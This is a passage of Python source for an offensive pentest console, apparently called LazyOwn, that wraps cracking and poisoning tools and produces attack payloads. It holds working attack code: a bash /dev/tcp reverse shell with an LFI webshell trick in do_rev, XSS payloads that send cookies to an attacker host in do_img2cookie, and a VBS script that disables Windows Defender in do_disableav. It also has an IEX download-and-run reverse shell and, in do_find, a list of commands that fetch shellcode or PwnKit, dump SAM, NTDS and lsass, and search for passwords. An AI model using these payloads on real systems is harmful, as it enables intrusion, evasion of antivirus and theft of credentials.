            # If `wordlist` is set to `/usr/share/wordlists/rockyou.txt`, the command executed will be `sudo john sessions/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512`.

        Note:
            - Ensure that the `wordlist` parameter is set before calling this function.
            - Provide the necessary options as a string argument (e.g., `--format=Raw-SHA512`) if needed.
            - If no options are provided, the function defaults to showing the cracked hashes.
        """

        wordlist = self.params["wordlist"]
        if not wordlist:
            print_error("wordlist must be set use set wordlist <path_to_wordlist>")
            return
        if line:
            print_msg(f"Try sudo john hash.txt {line}")  # line like -format=Raw-SHA512
            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} {line}")
        else:
            print_msg("Try sudo john hash.txt --show")
            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist}")
        return

    def do_hashcat(self, line):
        """
        Runs Hashcat with specified attack mode and hash type using a wordlist.

        This function executes the Hashcat tool with the specified mode and wordlist file. The hash value to be cracked should be provided as an argument.

        Usage:
            hashcat <mode>

        :param line: The hash type or mode to be used with Hashcat (e.g., 0 for MD5). This is a required argument.
        :type line: str
        :returns: None

        Manual execution:
        1. The command `hashcat -a 0 -m <mode> <hash> <wordlist>` is executed, where `<mode>` is the hash type, `<hash>` is the hash to be cracked, and `<wordlist>` is the path to the wordlist file.

        Dependencies:
        - Hashcat must be installed and available in the system's PATH.
        - Ensure the wordlist file exists at the specified path.

        Example:
            hashcat 0
            # If `wordlist` is set to `/usr/share/wordlists/rockyou.txt` and `line` is `0`, the command executed will be `hashcat -a 0 -m 0 /usr/share/wordlists/rockyou.txt`.

        Note:
            - Ensure that the `wordlist` parameter is set before calling this function.
            - The hash to be cracked must be passed as an argument when calling the function.
            - Replace `<mode>` with the appropriate Hashcat mode number (e.g., `0` for MD5, `1000` for NTLM).
        """

        wordlist = self.params["wordlist"]
        if not wordlist or not line:
            print_error(
                "wordlist must be set and you need pass the hash in argument ex: hashcat hash"
            )
            return
        print_msg(f"Try hashcat -a 0 -m {line} {wordlist}")
        os.system(f"hashcat -a 0 -m {line} {wordlist}")
        return

    def complete_hashcat(self, text, line, begidx, endidx):
        """Complete mode options and file paths for the sessions/hash.txt"""
        parts = line.split()

        if len(parts) == 1:
            return [
                str(x) for x in range(0, 20000) if str(x).startswith(text)
            ]  # Modify the range as needed for mode options

        if len(parts) == 2:
            return [f for f in glob.glob("sessions/hash.txt") if f.startswith(text)]

        return []

    def do_responder(self, line):
        """
        Runs Responder on a specified network interface with elevated privileges.

        This function executes the Responder tool with `sudo` on the network interface provided in the `device` parameter.

        Usage:
            responder

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
        1. The command `sudo responder -I <device>` is executed, where `<device>` is the network interface specified by the user.

        Dependencies:
        - The function relies on `sudo` to run Responder with root privileges.
        - Ensure that Responder is installed and available in the system's PATH.

        Example:
            responder
            # If `device` is set to `tun0`, the command executed will be `sudo responder -I tun0`.

        Note:
            - Ensure that the `device` parameter is set before calling this function.
            - Replace `<device>` with the appropriate network interface, such as `tun0`, `eth0`, etc.
            - Running Responder requires root privileges, so make sure the user running the command has the necessary permissions.
        """

        device = self.params["device"]
        if not device:
            print_error("Device must be set use set device <network_device_ex_tun0>")
            return
        print_msg(f"Try sudo responder -I {device} -w On ")
        os.system(f"sudo responder -I {device} -w On ")
        return

    def do_ip(self, line):
        """
        Displays IP addresses of network interfaces and copies the IP address from the `tun0` interface to the clipboard.

        This function performs the following tasks:
        1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
        2. Copies the IP address from the `tun0` interface to the clipboard using `xclip`.

        Usage:
            ip

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
        1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
        2. The IP address of the `tun0` interface is copied to the clipboard using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip`.

        Dependencies:
        - The function relies on `awk`, `grep`, `cut`, and `xclip` to process and copy the IP address.

        Example:
            ip
            # This will display IP addresses for all network interfaces and copy the IP address from `tun0` to the clipboard.

        Note:
            Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the clipboard will not be updated.
        """

        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )

        try:
            clipboard_ip = subprocess.check_output('xclip -o -sel clip', shell=True).decode().strip()
        except subprocess.CalledProcessError:
            clipboard_ip = ""

        print_msg(f"IP from tun0 copied to clipboard :) {RESET}")
        lhost = self.params['lhost']
        if not check_lhost(lhost):
            return
        if clipboard_ip and clipboard_ip != self.params['lhost']:
            lhost = clipboard_ip
            p.onecmd(f"set lhost {clipboard_ip}")
            self.custom_prompt = getprompt()
            self.prompt = f"{self.custom_prompt}"
            print_msg(f"Updated lhost to {clipboard_ip}")        
        return


    def do_ipp(self, line):
        """
        Displays IP addresses of network interfaces and prints the IP address from the `tun0` interface.

        This function performs the following tasks:
        1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
        2. Prints the IP address from the `tun0` interface.

        Usage:
            ip

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
        1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
        2. The IP address of the `tun0` interface is printed to the console using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1`.

        Dependencies:
        - The function relies on `awk`, `grep`, `cut`, and `xclip` to process and display the IP address.

        Example:
            ip
            # This will display IP addresses for all network interfaces and print the IP address from `tun0`.

        Note:
            Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the address will not be displayed.
        """

        # Display IP addresses for all network interfaces
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )

        # Print the IP address of the `tun0` interface
        try:
            ip_address = subprocess.check_output(
                "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1",
                shell=True
            ).decode().strip()
            
        
        except subprocess.CalledProcessError:
            print_error("Error retrieving IP address from tun0.")
        
        # Optionally update lhost
        lhost = self.params['lhost']
        if ip_address and ip_address != lhost:
            lhost = ip_address
            # Example of how you might set the new lhost
            self.params['lhost'] = lhost
            self.prompt = f"Updated lhost to {lhost}"
            print_msg(f"Updated lhost to {lhost}")

        return

    def do_rhost(self, line):
        """
        Copies the remote host (rhost) to the clipboard and updates the command prompt.

        This function performs two tasks:
        1. It copies the `rhost` parameter to the clipboard if it is valid.
        2. It updates the command prompt to include the `rhost` and the current working directory.

        Usage:
            rhost [clean]

        :param line: An optional argument that determines the behavior of the function:
            - If 'clean', it resets the command prompt to its default format.
            - If any other value, it updates the command prompt to include the `rhost` and current working directory.
        :type line: str
        :returns: None

        Manual execution:
        1. If `line` is 'clean':
        - The command prompt is reset to its default format.
        2. If `line` is any other value:
        - The command prompt is updated to show the `rhost` and the current working directory.
        - The `rhost` is copied to the clipboard using `xclip`.

        Dependencies:
        - The script uses `xclip` to copy the `rhost` to the clipboard.

        Example:
            rhost
            # This will copy the current `rhost` to the clipboard and update the prompt.
            
            rhost clean
            # This will reset the command prompt to its default format.

        Note:
            Ensure that the `rhost` is valid by checking it with the `check_rhost` function before copying it to the clipboard.
        """
        url   = self.params['url']
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        if not url:
            print_error("url must be set, use: set url http://host.ext")
            return
        cwd = os.getcwd()
        if line == 'clean':
            self.custom_prompt = getprompt()
            self.prompt = f"{self.custom_prompt}"
        else:
            self.custom_prompt = getprompt().replace(']', f" ~{GREEN}{cwd}{YELLOW}]{YELLOW}[{MAGENTA}{rhost}{YELLOW}][{BLUE}{url}{YELLOW}]")
            self.prompt = f"{self.custom_prompt}"
            os.system(f"printf '{rhost}' | xclip -sel clip")
            print_msg(f"ip from payload: {rhost=}, copied to clipboard :) {RESET}")
        return


    def do_rrhost(self, line):
        """
        Updates the command prompt to include the remote host (rhost) and current working directory.

        This function performs two tasks:
        1. It updates the command prompt to include the `rhost` and the current working directory if `line` is not 'clean'.
        2. It resets the command prompt to its default format if `line` is 'clean'.

        Usage:
            rhost [clean]

        :param line: An optional argument that determines the behavior of the function:
            - If 'clean', it resets the command prompt to its default format.
            - If any other value, it updates the command prompt to include the `rhost` and current working directory.
        :type line: str
        :returns: None

        Manual execution:
        1. If `line` is 'clean':
        - The command prompt is reset to its default format.
        2. If `line` is any other value:
        - The command prompt is updated to show the `rhost` and the current working directory.

        Example:
            rhost
            # This will update the command prompt to include the `rhost` and current working directory.
            
            rhost clean
            # This will reset the command prompt to its default format.

        Note:
            Ensure that the `rhost` is valid by checking it with the `check_rhost` function before updating the prompt.
        """
        url = self.params['url']
        rhost = self.params["rhost"]
        
        if not check_rhost(rhost):
            return
        
        if not url:
            print_error("URL must be set, use: set url http://host.ext")
            return
        
        cwd = os.getcwd()
        
        if line == 'clean':
            self.custom_prompt = getprompt()
            self.prompt = f"{self.custom_prompt}"
        else:
            self.custom_prompt = getprompt().replace(']', f" ~{GREEN}{cwd}{YELLOW}]{YELLOW}[{MAGENTA}{rhost}{YELLOW}][{BLUE}{url}{YELLOW}]")
            self.prompt = f"{self.custom_prompt}"
            print_msg(f"Updated prompt with rhost: {rhost} and current directory.")
        return

    def do_banner(self, line):
        """Show the banner"""
        if NOBANNER is False:
            print_msg(
                f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}"
            )
            time.sleep(0.2)
            print_msg(LazyOwnShell().intro)
        return

    def do_py3ttyup(self, line):
        """
        Copies a Python reverse shell command to the clipboard.

        This function generates a Python command that uses the `pty` module to spawn a new shell and copies it to the clipboard. This is typically used for creating a TTY shell in a reverse shell situation.

        Usage:
            py3ttyup

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        1. The function creates a Python command with `pty.spawn` to open a shell.
        2. The command is copied to the clipboard using `xclip`.
        3. A message is printed to inform the user that the command has been copied.

        Dependencies:
        - The script uses `xclip` to copy the command to the clipboard.

        Example:
            py3ttyup
            # This will copy the Python command `python3 -c 'import pty; pty.spawn("/bin/bash")'` to the clipboard.

        Note:
            This command is often used in scenarios where you need a more interactive shell from a reverse shell connection.
        """

        os.system(
            'echo "python3 -c \'import pty;pty.spawn("/bin/bash")\'"| xclip -sel clip'
        )
        print_msg(
            'Try... echo "python3 -c \'import pty;pty.spawn("/bin/bash")\'"| xclip -sel clip # copied to clipboard :) '
        )
        return

    def do_rev(self, line):
        """
        Copies a reverse shell payload to the clipboard.

        This function generates a reverse shell command that connects back to the specified host and port, and copies it to the clipboard. It also provides a way to execute the payload via a PHP-based web shell.

        Usage:
            rev

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `lport`, and `rhost` parameters are set.
        2. The function generates a reverse shell command in Bash and prints instructions for using the payload.
        3. It also provides an example URL and PHP code snippet that decodes and executes the base64-encoded payload.
        4. The reverse shell command is copied to the clipboard using `xclip`.

        Dependencies:
        - The script uses `xclip` to copy the command to the clipboard.
        - Base64 encoding is used to obfuscate the payload.

        Example:
            rev
            # This will copy a reverse shell command to the clipboard and display instructions for its use.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rhost = self.params["rhost"]
        if not lhost or not lport or not rhost:
            print_error(f"rhost, lhost and lport must be set.{RESET}")
            return

        print_msg(
            f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' {MAGENTA}copied to cplipboard :D "
        )
        print_warn("<modo de uso>")
        print(
            f"http://{rhost}/?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/ "
        )
        print('<?shell_exec(base64_decode("')
        os.system(
            f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" | base64"
        )
        print('"));?>')
        print("+/tmp/shell.php")
        print_warn("</modo de uso>")
        os.system(
            f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip"
        )

        return

    def do_img2cookie(self, line):
        """
        Copies a malicious image tag payload to the clipboard.

        This function crafts and copies two different image tag payloads designed to steal cookies from a target's browser. The payloads use JavaScript to send cookies to a specified host and port. The user is prompted to select which payload to copy to the clipboard.

        Usage:
            img2cookie

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `lport`, and `rhost` parameters are set.
        2. The function generates two payloads:
        - Payload 1: A script that sends cookies to the specified host and port.
        - Payload 2: An image tag with an `onerror` event that fetches cookies and sends them to the specified host and port using Base64 encoding.
        3. The user is prompted to choose between the two payloads, which are then copied to the clipboard.

        Dependencies:
        - The script uses `xclip` to copy the payloads to the clipboard.
        - Ensure that `lhost`, `lport`, and `rhost` parameters are set with appropriate values.

        Example:
            img2cookie
            # This will prompt you to select between two payloads. The chosen payload will be copied to the clipboard.
        """

        lhost = self.params.get("lhost")
        lport = self.params.get("lport")
        rhost = self.params.get("rhost")
        if not lhost or not lport or not rhost:
            print_error(f"rhost, lhost and lport must be set.{RESET}")
            return

        print_msg(f"Crafting img payload...")

        # Payload 1
        command1 = f'echo "<script>new Image().src="http://{lhost}:80/cookie?c="+document.cookie;</script>" | xclip -sel clip'

        # Payload 2
        cmd = f"""fetch('http://{lhost}:80/?cookie='+document.cookie)"""
        utf8_encoded = cmd.encode("utf-8")
        base64_encoded = base64.b64encode(utf8_encoded)
        base64_string = base64_encoded.decode("utf-8").strip()
        command2 = f"echo \"<img src=x onerror=eval(atob('{base64_string}'))>\" | xclip -sel clip"

        # Inform user and ask for selection
        print_warn("<modo_de_uso>")
        print_msg(f"Payload 1: {command1}")
        print_msg(f"Payload 2: {command2}")
        print_warn("</modo_de_uso>")

        choice = input(
            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}"
        ).strip()

        if choice == "1":
            os.system(command1)
            print_msg(f"Payload 1 copied to Clipboard")
        elif choice == "2":
            os.system(command2)
            print_msg(f"Payload 2 copied to Clipboard")
        else:
            print_error("Invalid choice. Please select 1 or 2.")

        return

    def do_disableav(self, line):
        """
        Creates a Visual Basic Script (VBS) to attempt to disable antivirus settings.

        This function generates a VBS script designed to modify Windows Registry settings and run PowerShell commands to disable various Windows Defender antivirus features.

        Usage:
            disableav

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        1. The function writes a VBS script to a file named `aav.vbs` in the `sessions` directory.
        2. The script:
        - Elevates its privileges if not already running as an administrator.
        - Modifies Windows Registry settings to disable various Windows Defender features.
        - Outputs PowerShell commands to disable additional Windows Defender settings.

        The VBS script:
        - Uses `WScript.Shell` to modify the Windows Registry for disabling Windows Defender.
        - Calls PowerShell commands to further disable antivirus features.

        Dependencies:
        - The script must be executed on a Windows system where you have administrative privileges.
        - Ensure you have appropriate permissions to modify Windows Registry settings.

        Example:
            disableav
            # This will create the `aav.vbs` file with the specified content in the `sessions` directory.
        """


        file_aav = '''If Not WScript.Arguments.Named.Exists("elevate") Then
        CreateObject("Shell.Application").ShellExecute WScript.FullName _
            , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
        WScript.Quit
        End If

        On Error Resume Next
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",1,"REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRawWriteNotification","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"

        WScript.Sleep 100

        outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
        outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
        outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
        outputMessage("Set-MpPreference -DisableIOAVProtection $true")
        outputMessage("Set-MpPreference -DisableScriptScanning $true")
        outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
        outputMessage("Set-MpPreference -MAPSReporting 0")
        outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
        outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
        outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
        outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")


        Sub outputMessage(byval args)
        On Error Resume Next
        Set objShell = CreateObject("Wscript.shell")
        objShell.run("powershell " + args), 0
        End Sub'''.replace("        ", "")
        filename = "sessions/aav.vbs"
        print_msg(f"new file in {filename} '")
        with open(filename, "w") as f:
            f.write(file_aav)
        f.close()
        print_msg(
            f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {file_aav} "
        )
        return

    def do_conptyshell(self, line):
        """
        Downloads ConPtyShell and prepares a PowerShell command for remote access.

        This function downloads the ConPtyShell PowerShell script and ZIP archive to the `sessions` directory and copies a PowerShell command to the clipboard for easy execution.

        Usage:
            conptyshell

        :param line: This parameter is not used in the function. The required host and port are retrieved from the `params` dictionary.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that the `lhost` and `lport` parameters are set with the local host and port for the reverse shell.
        2. The function downloads `Invoke-ConPtyShell.ps1` and `ConPtyShell.zip` to the `sessions` directory.
        3. Constructs a PowerShell command to run `Invoke-ConPtyShell.ps1` with the specified local IP and port.
        4. Copies the constructed command to the clipboard using `xclip`.

        The constructed PowerShell command:
        - Uses `Invoke-ConPtyShell.ps1` to establish a reverse shell connection to the specified `lhost` and `lport`.
        - Sets the PowerShell execution policy to bypass and specifies the dimensions of the terminal window.

        Dependencies:
        - `wget`: For downloading files from the internet.
        - `xclip`: For copying commands to the clipboard.
        - Ensure `ConPtyShell` script and ZIP are compatible with your environment.

        Example:
            conptyshell
            # This will download the required files and copy the PowerShell command to the clipboard.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not lhost or not lport:
            print_error(f"lhost and lport must be set.{RESET}")
            return

        os.system(
            "cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip"
        )
        cmd = f"""IEX(New-Object New.WebClient).downloadString('http://{lhost}/Invoke-ConPtyShell.ps1') ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell  -RemoteIp {lhost} -RemotePort {lport} -Rows 24 -Cols 135'"""
        os.system(f"echo '{cmd}' |  xclip -sel clip")
        print_msg(f"{cmd} {YELLOW} Copied to clipboard :D {RESET}")
        return

    def do_pwncatcs(self, line):
        """
        Runs `pwncat-cs` with the specified port for listening.

        This function starts a `pwncat-cs` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.

        Usage:
            pwncatcs <port>

        :param line: The port number to use for the `pwncat-cs` listener. If not provided, it defaults to the `lport` parameter.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `pwncat-cs` is installed and accessible from your command line.
        2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
        3. Run the function to start `pwncat-cs` on the specified port.

        If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.

        After starting the listener, the function prints a message indicating that `pwncat-cs` is running on the specified port and another message when the session is closed.

        Dependencies:
        - `pwncat-cs`: A tool used for creating reverse shells or bind shells.
        """

        lport = self.params["lport"]
        if not lport and not line:
            print_error(
                f"lport must be set or pass the port by parameter like: nc 6666.{RESET}"
            )
            return
        if not line:
            print_msg(f"Try.. pwncat-cs -lp {lport}{RESET}")
            os.system(f"pwncat-cs -lp {lport}")
        else:
            print_msg(f"Try.. pwncat-cs -lp {line}{RESET}")
            os.system(f"pwncat-cs -lp {line}")
        print_msg(
            f"{RED}[*] {YELLOW} Shutdown pwncat-cs sessions in port {RED} [{lport}|{line}] {RESET}"
        )
        return

    def do_find(self, line):
        """
        Automates command execution based on a list of aliases and commands.

        1. Displays available aliases and their commands.
        2. Asks the user if they want to execute a specific command.
        3. If confirmed, displays the alias and command with a number.
        4. Executes the command and copies it to the clipboard.

        :param line: The command line input containing the list of alias and command pairs.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Prepare the list of alias and command pairs in the format: "alias command".
        - Provide this list as input to the function.
        - Confirm the execution of the desired command when prompted.
        - Manually copy the command to the clipboard if needed.

        Note: Ensure `xclip` is installed and properly configured to use clipboard functionalities.
        """
        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return

        commands_list = [
            ("List dir", "ls -lha"),
            ("list file attributes on a Linux second extended file system", "lsattr -va"),
            ("show opened ports", "netstat -an | grep -i listen"),
            ("process status", "ps aux"),
            ("Find", "find / -type f \( -iname '*cred*' -o -iname '*pass*' -o -iname 'credentials' -o -iname 'password' \) -print -o -exec grep -i -l -e 'cred' -e 'pass' -e 'credentials' -e 'password' {} + 2>/dev/null"),
            ("find all suid files", "find / -type f -perm -04000 -ls"),
            ("find suid files in current dir", "find . -type f -perm -04000 -ls"),
            ("find all sgid files", "find / -type f -perm -02000 -ls"),
            ("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
            ("find config.inc.php files", "find / -type f -name config.inc.php"),
            ("find config* files", "find / -type f -name \"config*\""),
            ("find config* files in current dir", "find . -type f -name \"config*\""),
            ("find all writable folders and files", "find / -perm -2 -ls"),
            ("find all writable folders and files in current dir", "find . -perm -2 -ls"),
            ("find all service.pwd files", "find / -type f -name service.pwd"),
            ("find service.pwd files in current dir", "find . -type f -name service.pwd"),
            ("find all .htpasswd files", "find / -type f -name .htpasswd"),
            ("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
            ("find all .bash_history files", "find / -type f -name .bash_history"),
            ("find .bash_history files in current dir", "find . -type f -name .bash_history"),
            ("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
            ("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
            ("Timers", "systemctl list-timers"),
            ("python", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
            ("python shellcode.bin", f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'),
            ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit ; chmod +x ./PwnKit ; ./PwnKit"),
            ("locate httpd.conf files", "locate httpd.conf"),
            ("locate vhosts.conf files", "locate vhosts.conf"),
            ("locate proftpd.conf files", "locate proftpd.conf"),
            ("locate psybnc.conf files", "locate psybnc.conf"),
            ("locate my.conf files", "locate my.conf"),
            ("locate admin.php files", "locate admin.php"),
            ("locate cfg.php files", "locate cfg.php"),
            ("locate conf.php files", "locate conf.php"),
            ("locate config.dat files", "locate config.dat"),
            ("locate config.php files", "locate config.php"),
            ("locate config.inc files", "locate config.inc"),
            ("locate config.inc.php", "locate config.inc.php"),
            ("locate config.default.php files", "locate config.default.php"),
            ("locate config* files", "locate config"),
            ("locate .conf files", "locate '.conf'"),
            ("locate .pwd files", "locate '.pwd'"),
            ("locate .sql files", "locate '.sql'"),
            ("locate .htpasswd files", "locate '.htpasswd'"),
            ("locate .bash_history files", "locate '.bash_history'"),
            ("locate .mysql_history files", "locate '.mysql_history'"),
            ("locate .fetchmailrc files", "locate '.fetchmailrc'"),
            ("locate backup files", "locate backup"),
            ("locate dump files", "locate dump"),
            ("locate priv files", "locate priv"),
            ("lsof LISTEN PORTS", "sudo lsof -i -P -n | grep LISTEN"),
            ("WIN find password", "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml"),
            ("WIN List Directory", "dir"),
            ("WIN Find index.php in current dir", "dir /s /w /b index.php"),
            ("WIN Find *config*.php in current dir", "dir /s /w /b *config*.php"),
            ("WIN Show active connections", "netstat -an"),
            ("WIN Show running services", "net start"),
            ("WIN User accounts", "net user"),
            ("WIN Show computers", "net view"),
            ("WIN ARP Table", "arp -a"),
            ("WIN IP Configuration", "ipconfig /all"),
            ("WIN Crear Instantánea:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
            ("WIN copy sam1", "reg.exe save hklm\sam C:\sam.save"),
            ("WIN copy sam2", "reg.exe save hklm\system C:\system.save"),
            ("WIN copy sam3", "reg.exe save hklm\security C:\security.save"),
            ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full'),
            ("WIN Execute shellcode",f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'),
            ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }')
        ]
        
        for idx, (alias, cmd) in enumerate(commands_list):
            if cmd: 
                print_msg(f"{idx + 1}. Alias: {alias}, Command: {cmd}")

        try:
            choice = int(input("Enter the number of the command you want to execute: ")) - 1
            if 0 <= choice < len(commands_list):
                selected_alias, selected_cmd = commands_list[choice]
                if selected_cmd: 
                    confirm = input(f"Do you want to execute the command: {selected_cmd}? (y/n): ").strip().lower()
                    
                    if confirm == 'y':
                        print_warn(f"Executing command: {selected_cmd}")
                        subprocess.run(selected_cmd + " 2>/dev/null", shell=True)
                        
                     
                        command_clipboard = subprocess.Popen(
                            ['xclip', '-selection', 'clipboard'],
                            stdin=subprocess.PIPE
                        )
                        command_clipboard.communicate(input=selected_cmd.encode())
                        print_msg(f"Command copied to clipboard: {selected_cmd}")
                    else:
                        print_warn("Command execution cancelled.")
                          
                        command_clipboard = subprocess.Popen(
                            ['xclip', '-selection', 'clipboard'],
                            stdin=subprocess.PIPE
                        )
                        command_clipboard.communicate(input=selected_cmd.encode())
                        print_msg(f"Command copied to clipboard: {selected_cmd}")
                else:
                    print_error("Selected command is empty.")
            else:
                print_error("Invalid choice. Please select a valid number.")
        except ValueError:
            print_error("Invalid input. Please enter a number.")
        except Exception as e:
            print_error(f"An error occurred: {e}")

    def do_sh(self, line):
        """
        Executes a shell command directly from the LazyOwn interface.

        This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell. 
        It checks if a command is provided, prints a message indicating the command being executed, and then 
        runs the command using `os.system`.

        Usage:
            sh <command>

        :param line: The shell command to be executed.
        :type line: str
        :raises ValueError: If no command is provided, an error message is printed indicating that a command is required.
        :returns: None

        Example:
            sh ls -la
            # This will execute 'ls -la' in the shell without exiting LazyOwn.

        Note:
            Ensure that the command provided is safe to execute and does not include potentially harmful operations.

        """
        if not line:
            print_error(f"You must pass the command linke argument")
            return
        print_msg(f"Try... {line}{RESET}")
        os.system(f"{line}")
        return

    def do_pwd(self, line):
        """
        Displays the current working directory and lists files, and copies the current directory path to the clipboard.

        This function performs the following tasks:
        1. Displays the current working directory with `pwd` and lists files in the directory using `ls`. 
        2. Copies the current directory path to the clipboard using `xclip`.

        Usage:
            pwd

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `echo -e "[\e[96m\`pwd\`\e[0m]\e[34m" && ls && echo -en "\e[0m"` is executed to display the current working directory and list files in it.
            2. The current directory path is copied to the clipboard using the command `pwd | xclip -sel clip`.

        Dependencies:
            - The function relies on `echo`, `pwd`, `ls`, and `xclip` to display the directory and copy the path to the clipboard.

        Example:
            pwd
